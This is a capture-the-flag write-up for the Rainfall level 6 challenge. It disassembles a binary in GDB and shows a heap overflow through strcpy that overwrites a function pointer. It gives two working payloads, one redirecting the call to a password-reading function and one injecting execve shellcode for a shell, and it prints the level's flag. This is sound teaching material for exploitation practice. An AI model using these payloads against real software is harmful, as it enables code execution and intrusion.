---
title: "[CTF] Rainfall Level 6: Function Redirection via Buffer Overflow"
date: 2023-04-18 15:05:22
type: articles
tags: [it, c, asm, ctf, exe, rainfall]
description: "Learn how to reverse engineer an executable by reading the Assembly code using GDB and make a buffer overflow attack to redirect the execution of a function..."
image: "/assets/ctf/road-shadowing.jpeg"
---

This executable is the 7th one from the ISO file provided to us as a CTF challenge, for more context please visit [here](https://github.com/aallali/42-rainfall).
We retrieve the assembly code using gdb:
```bash
level6@RainFall:~$ gdb ./level6
```

## Notes

```c
0x08048454  n    : fn : not called in any place
0x08048468  m    : fn : called in main
0x0804847c  main : rak 3arf
```

## main() Disassembly (0x0804847c)

- Notebook: (to convert `hex` to `dec` and assign variable names for better reading)

```c
{
    int argc = ebp+0x8
    char **argv = ebp+12

    char *argBuffer = esp+28
    char *funcBuffer = esp+24
  
    // 0x20 ... 32
    // 0x40 ... 64
    // 0x1c ... 28
    // 0x18 ... 24
    // 0xc  ... 12
}
```

**`<+0> -> <+6> : prepare stack frame for n function with size 32`**

```c
0x0804847c <+0>:	push   ebp
0x0804847d <+1>:	mov    ebp,esp
0x0804847f <+3>:	and    esp,0xfffffff0 // stack alignement
0x08048482 <+6>:	sub    esp,32
```

**`<+9> -> <+21> : allocate 64 bytes from the Heap and put the address in argBuffer`**

```c
0x08048485 <+9>:	mov    DWORD PTR [esp],64
0x0804848c <+16>:	call   0x8048350 <malloc@plt>
0x08048491 <+21>:	mov    DWORD PTR [argBuffer],eax
argBuffer = malloc(64)
```

**`<+25> -> <+37> : allocate 4 bytes from the Heap and put the address in funcBuffer`**
```c
0x08048495 <+25>:	mov    DWORD PTR [esp],0x4
0x0804849c <+32>:	call   0x8048350 <malloc@plt>
0x080484a1 <+37>:	mov    DWORD PTR [funcBuffer],eax
funcBuffer = malloc(4)
```
**`<+41> -> <+50> : put the address of function m in the area of heap pointed by funcBuffer`**

```c
0x080484a5 <+41>:	mov    edx,0x8048468(address of m function)
0x080484aa <+46>:	mov    eax,DWORD PTR [funcBuffer]
0x080484ae <+50>:	mov    DWORD PTR [eax],edx
funcBuffer = m
```

**`<+52> -> <+58> : copy first param into Heap area pointed by the address saved in argBuffer with strcpy`**
**`strcpy : not protected against buffer overflow`**

```c
0x080484b0 <+52>:	mov    eax,DWORD PTR [argv]
0x080484b3 <+55>:	add    eax,4 // argv[1]
0x080484b6 <+58>:	mov    eax,DWORD PTR [eax]
0x080484b8 <+60>:	mov    edx,eax // edx = eax = argv[1]
0x080484ba <+62>:	mov    eax,DWORD PTR [argBuffer] // eax = return of malloc(64) the address in the Heap
0x080484be <+66>:	mov    DWORD PTR [esp+4],edx // store edx respectivly at the first line in the stack
0x080484c2 <+70>:	mov    DWORD PTR [esp],eax // store eax in top of stack preparing the args for strcpy
0x080484c5 <+73>:	call   0x8048340 <strcpy@plt> // strcpy(eax, edx) <=> strcpy(argBuffer), argv[1])
strcpy(argBuffer), argv[1])
```

**`<+78> -> <+84> : get the address stored in address return by malloc(4) and call it , which is (m) function`**

```c
// const m2 = malloc(2)
0x080484ca <+78>:	mov    eax,DWORD PTR [funcBuffer]
0x080484ce <+82>:	mov    eax,DWORD PTR [eax] =  eax = *eax = &m
0x080484d0 <+84>:	call   eax // (**&m)() call the address in eax as function eax() in other word : m()
m()
```

**`<+86> -> <+87> : quit the main function`**

```c
0x080484d2 <+86>:	leave
0x080484d3 <+87>:	ret
```
## m() Disassembly (0x08048468)

- Notebook: (to convert `hex` to `dec` and assign variable names for better reading)

```c
{
    // 0x18 ... 24
}
```

**`<+0> -> <+3> : setup frame for m function with size of 24 bytes`**

```c
0x08048468 <+0>:	push   ebp
0x08048469 <+1>:	mov    ebp,esp
0x0804846b <+3>:	sub    esp,24
```

**`<+6> -> <+13> : print "Nope" to screen`**

```c
0x0804846e <+6>:	mov    DWORD PTR [esp],0x80485d1 // "Nope"
0x08048475 <+13>:	call   0x8048360 <puts@plt>
puts("Nope");
```

**`<+18> -> <+19> : exit the function`**

```c
0x0804847a <+18>:	leave  
0x0804847b <+19>:	ret   
```

## n() Disassembly (0x08048454)

- Notebook: (to convert `hex` to `dec` and assign variable names for better reading)

```c
{
    // 0x18 ... 24
}
```

**`<+0> -> <+3> : setup frame for n function with size of 24 bytes`**

```c
0x08048454 <+0>:	push   ebp
0x08048455 <+1>:	mov    ebp,esp
0x08048457 <+3>:	sub    esp,24
```

**`<+6> -> <+13> : call system to read password`**

```c
0x0804845a <+6>:	mov    DWORD PTR [esp],0x80485b0 // "/bin/cat /home/user/level7/.pass"
0x08048461 <+13>:	call   0x8048370 <system@plt>
system("/bin/cat /home/user/level7/.pass");
```

**`<+18> -> <+19> : quit the n function`**

```c
0x08048466 <+18>:	leave  
0x08048467 <+19>:	ret  
return;
```
## Code Prediction

```c
void n() {
    system("/bin/cat /home/user/level7/.pass");
    return;
}

void m() {
    puts("Nope");
    return;
}
int main(int argc(ebp+0x8), char **argv(ebp+12)) {
	const argBuffer = malloc(64);
	const funcBuffer = malloc(4);

	funcBuffer = 0x8048468
	strcpy(argBuffer, argv[1]);

	(**funcBuffer)();

    return;
    
}
```

## Stack Illustration

```c
                high address
            +---------------------+
            :         argv        :
EBP+12  ->  +---------------------+
            :         argc        :
EBP+8   ->  +---------------------+
            :          eip        :
EBP+4   ->  +---------------------+
            :          ebp        :
EBP     ->  +---------------------+ -------\
            :      extra space    :        |
            :  stack alignment    :        |
ESP+28  ->  +---------------------+        |
            : malloc(64)  return  :        |
ESP+24  ->  +---------------------+        |   
            : malloc(4)   return  :        |
            +---------------------+        |  
                      .                    |
                      .                    | 32 bytes
                      .                    |
                      .                    |
                      .                    |
            +---------------------+        |
            :        argv[1]      :        |
ESP+4   ->  +---------------------+        |
            : malloc(64)  return  :        |
ESP         +---------------------+ -------/
                low address
``` 

## Exploit Process

- Lets send 64 characters to the program and see what's going on in the memory, exactly in the Heap area:

```c
    (gdb) b * 0x080484ca
    Breakpoint 3 at 0x80484ca
    (gdb) run $(python -c 'print("A"*64)')
    Starting program: /home/user/level6/level6 $(python -c 'print("A"*64)')

    Breakpoint 3, 0x080484ca in main ()

    (gdb) x/25wx 0x804a000
    0x804a000:	0x00000000	0x00000049	0x41414141	0x41414141
    0x804a010:	0x41414141	0x41414141	0x41414141	0x41414141
    0x804a020:	0x41414141	0x41414141	0x41414141	0x41414141
    0x804a030:	0x41414141	0x41414141	0x41414141	0x41414141
    0x804a040:	0x41414141	0x41414141	0x00000000	0x00000011
    0x804a050:	0x08048468	0x00000000	0x00000000	0x00020fa9
    0x804a060:	0x00000000
    (gdb) 
```

- **argBuffer start at: 0x804a008**: contains: _A*64_
- **funcBuffer start at: 0x804a050**: contains: _0x08048468 (address of m function)_
- The code calls the address saved in funcBuffer.
- To reach the funcBuffer from argBuffer we have to write 72 characters.
- To overwrite the m address in funcBuffer we have to add that address after 72 characters.

```c
    (gdb) run $(python -c 'print("A"*72 + "BBBB")')
    The program being debugged has been started already.
    Start it from the beginning? (y or n) y

    Starting program: /home/user/level6/level6 $(python -c 'print("A"*72 + "BBBB")')

    Breakpoint 3, 0x080484ca in main ()
    (gdb) x/25wx 0x804a000
    0x804a000:	0x00000000	0x00000049	0x41414141	0x41414141
    0x804a010:	0x41414141	0x41414141	0x41414141	0x41414141
    0x804a020:	0x41414141	0x41414141	0x41414141	0x41414141
    0x804a030:	0x41414141	0x41414141	0x41414141	0x41414141
    0x804a040:	0x41414141	0x41414141	0x41414141	0x41414141
    0x804a050:	0x42424242	0x00000000	0x00000000	0x00020fa9
    0x804a060:	0x00000000
    (gdb)
```

- Notice that m address is overwritten by **0x42424242(BBBB)**.

### Possible Solutions

1. Overwrite m address in funcBuffer with address of **n function (0x08048454)** (because it executes the shell and prints the pass file).
2. Inject shellcode in argBuffer:
   - Overwrite m address with address of **argBuffer (0x804a008)**.

## Solution

### 1. Redirect m to n

- **Payload: `$(python -c 'print("A"*72 + "\x08\x04\x84\x54"[::-1])')`**

```bash
level6@RainFall:~$ ./level6 $(python -c 'print("A"*72 + "\x08\x04\x84\x54"[::-1])')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
level6@RainFall:~$ 
```

### 2. Inject shellcode in Heap area and redirect funcBuffer to argBuffer address

- **Payload: `NOPS + SHELLCODE + ADDRESS(argBuffer)`**
- `python -c 'print("\x90" * 51 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x08\x04\xa0\x08"[::-1])'`

```bash
level6@RainFall:~$ ./level6  $(python -c 'print("\x90" * 51 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x08\x04\xa0\x08"[::-1])')
$ whoami
level7
$ pwd
/home/user/level6
$ cd /home/user/level7    
$ cat .pass
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
$ 
```

```info
The flag for this level is f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d.
```